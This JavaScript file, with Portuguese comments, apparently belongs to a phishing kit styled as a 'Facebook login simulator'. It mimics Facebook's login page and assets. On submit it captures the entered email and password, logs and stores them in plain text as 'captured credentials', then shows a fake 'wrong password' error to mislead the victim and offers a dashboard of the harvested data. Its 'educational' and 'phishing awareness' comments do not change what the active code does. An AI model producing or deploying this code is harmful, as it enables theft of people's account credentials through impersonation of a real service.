// main-script.js
class FacebookLoginSimulator {
    constructor() {
        this.init();
    }

    init() {
        this.setupPasswordToggle();
        this.setupFormHandler();
        this.setupInputValidation();
        this.setupUIEnhancements();
        this.setupAnalytics();
    }

    // Toggle de mostrar/esconder senha
    setupPasswordToggle() {
        const passwordField = document.getElementById('pass');
        const passwordContainer = passwordField.parentElement;
        
        // Criar botão de toggle
        const toggleButton = document.createElement('div');
        toggleButton.className = '_9ls7';
        toggleButton.innerHTML = `
            <a href="#" role="button">
                <div class="_9lsa">
                    <div class="_9lsb" style="
                        background-image: url('https://static.xx.fbcdn.net/rsrc.php/v4/y2/r/O287_AcFyg4.png');
                        background-size: 20px 20px;
                        width: 20px;
                        height: 20px;
                        background-repeat: no-repeat;
                        filter: invert(39%) sepia(21%) saturate(200%) saturate(109.5%) hue-rotate(174deg) brightness(94%) contrast(86%);
                    "></div>
                </div>
            </a>
        `;

        passwordContainer.appendChild(toggleButton);

        let passwordVisible = false;

        toggleButton.addEventListener('click', (e) => {
            e.preventDefault();
            passwordVisible = !passwordVisible;
            
            if (passwordVisible) {
                passwordField.type = 'text';
                toggleButton.querySelector('._9lsb').style.filter = 'invert(35%) sepia(44%) saturate(3718%) hue-rotate(202deg) brightness(98%) contrast(91%)';
            } else {
                passwordField.type = 'password';
                toggleButton.querySelector('._9lsb').style.filter = 'invert(39%) sepia(21%) saturate(200%) saturate(109.5%) hue-rotate(174deg) brightness(94%) contrast(86%)';
            }
        });
    }

    // Manipulador do formulário
    setupFormHandler() {
        const form = document.getElementById('login_form');
        const emailField = document.getElementById('email');
        const passwordField = document.getElementById('pass');
        const errorDiv = document.querySelector('._9ay7');

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const email = emailField.value.trim();
            const password = passwordField.value;

            // Validar campos
            if (!this.validateEmail(email)) {
                this.showError('Por favor, insira um email ou número de telefone válido.');
                return;
            }

            if (!password) {
                this.showError('Por favor, insira sua senha.');
                return;
            }

            // Simular tentativa de login
            this.simulateLogin(email, password);
        });

        // Limpar erro ao digitar
        [emailField, passwordField].forEach(field => {
            field.addEventListener('input', () => {
                this.hideError();
            });
        });
    }

    // Validação de inputs
    setupInputValidation() {
        const emailField = document.getElementById('email');
        
        emailField.addEventListener('blur', () => {
            const email = emailField.value.trim();
            if (email && !this.validateEmail(email)) {
                emailField.style.borderColor = '#f02849';
            } else {
                emailField.style.borderColor = '#dddfe2';
            }
        });

        emailField.addEventListener('focus', () => {
            emailField.style.borderColor = '#1877f2';
        });
    }

    // Melhorias de UI
    setupUIEnhancements() {
        // Adicionar loading no botão
        const loginButton = document.getElementById('loginbutton');
        
        loginButton.addEventListener('click', () => {
            // Efeito visual de clique
            loginButton.style.transform = 'scale(0.98)';
            setTimeout(() => {
                loginButton.style.transform = 'scale(1)';
            }, 150);
        });

        // Prevenir múltiplos cliques
        let isSubmitting = false;
        const form = document.getElementById('login_form');
        
        form.addEventListener('submit', () => {
            if (isSubmitting) return;
            isSubmitting = true;
            
            setTimeout(() => {
                isSubmitting = false;
            }, 2000);
        });
    }

    // Analytics e tracking educacional
    setupAnalytics() {
        // Track de interações para análise educacional
        const trackEvent = (eventName, data = {}) => {
            console.log(`[EDUCATIONAL_TRACKING] ${eventName}:`, {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ...data
            });
        };

        // Track de foco nos campos
        document.getElementById('email').addEventListener('focus', () => {
            trackEvent('email_field_focused');
        });

        document.getElementById('pass').addEventListener('focus', () => {
            trackEvent('password_field_focused');
        });

        // Track de tentativas de submit
        document.getElementById('login_form').addEventListener('submit', (e) => {
            const formData = new FormData(e.target);
            trackEvent('login_attempt', {
                email_length: formData.get('email')?.length || 0,
                password_length: formData.get('pass')?.length || 0,
                has_email: !!formData.get('email'),
                has_password: !!formData.get('pass')
            });
        });
    }

    // Métodos auxiliares
    validateEmail(input) {
        // Validação simples de email ou telefone
        if (!input) return false;
        
        // Verificar se é email
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (emailRegex.test(input)) return true;
        
        // Verificar se é telefone (apenas números, pelo menos 8 dígitos)
        const phoneRegex = /^\d{8,}$/;
        if (phoneRegex.test(input.replace(/\D/g, ''))) return true;
        
        return false;
    }

    showError(message) {
        const errorDiv = document.querySelector('._9ay7');
        errorDiv.innerHTML = message;
        errorDiv.style.display = 'block';
        
        // Scroll para o erro
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    hideError() {
        const errorDiv = document.querySelector('._9ay7');
        errorDiv.style.display = 'none';
    }

    simulateLogin(email, password) {
        const loginButton = document.getElementById('loginbutton');
        const originalText = loginButton.textContent;
        
        // Mostrar loading
        loginButton.innerHTML = '<div style="display:inline-block;width:16px;height:16px;border:2px solid #ffffff;border-radius:50%;border-top-color:transparent;animation:spin 1s linear infinite;"></div>';
        loginButton.disabled = true;
        
        // Simular delay de rede
        setTimeout(() => {
            // Aqui você pode adicionar a lógica para processar as credenciais
            this.processCredentials(email, password);
            
            // Restaurar botão
            loginButton.innerHTML = originalText;
            loginButton.disabled = false;
        }, 1500 + Math.random() * 1000); // Delay aleatório entre 1.5-2.5s
    }

    // No método processCredentials, substitua por:
processCredentials(email, password) {
    console.group('🔐 CREDENCIAIS CAPTURADAS');
    console.log('📧 Email:', email);
    console.log('🔑 Senha:', password);
    console.groupEnd();

    // ⚠️ SALVAR NO ARMAZENAMENTO LOCAL
    const savedEntry = storageManager.saveCredential(email, password);
    console.log('💾 Salvo no storage:', savedEntry);

    // Mostrar mensagem de erro (comportamento realista)
    this.showError('A senha que você inseriu está incorreta. <a href="#" style="color: #1877f2; text-decoration: none;">Esqueceu a senha?</a>');
    
    // Opcional: Redirecionar para dashboard após 2 segundos
    setTimeout(() => {
        if (confirm('Deseja ver o dashboard com os dados capturados?')) {
            window.location.href = 'dashboard.html';
        }
    }, 2000);
}

    maskEmail(email) {
        // Mascarar email para logs seguros
        const [username, domain] = email.split('@');
        const maskedUsername = username.length > 2 
            ? username.substring(0, 2) + '*'.repeat(username.length - 2)
            : '*'.repeat(username.length);
        return `${maskedUsername}@${domain}`;
    }

    maskPassword(password) {
        // Mascarar senha completamente
        return password > 3 ? password.substring(0, 3) + '*'.repeat(password.length - 3) : '*'.repeat(password.length);
    }

    sendToEducationalEndpoint(email, password) {
        // ⚠️ EM AMBIENTE EDUCACIONAL CONTROLADO APENAS
        // Em produção real, isso seria um crime
        
        fetch('/api/educational-log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                timestamp: new Date().toISOString(),
                masked_email: this.maskEmail(email),
                password_length: password.length,
                user_agent: navigator.userAgent,
                purpose: 'phishing_awareness_education'
            })
        }).catch(error => {
            console.log('Log educacional não enviado (esperado em demo):', error);
        });
    }
}

// CSS para animação de loading
const style = document.createElement('style');
style.textContent = `
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .login-loading {
        display: inline-block;
        width: 16px;
        height: 16px;
        border: 2px solid #ffffff;
        border-radius: 50%;
        border-top-color: transparent;
        animation: spin 1s linear infinite;
    }
    
    .shake {
        animation: shake 0.5s linear;
    }
    
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);

// Inicializar quando DOM estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        new FacebookLoginSimulator();
    });
} else {
    new FacebookLoginSimulator();
}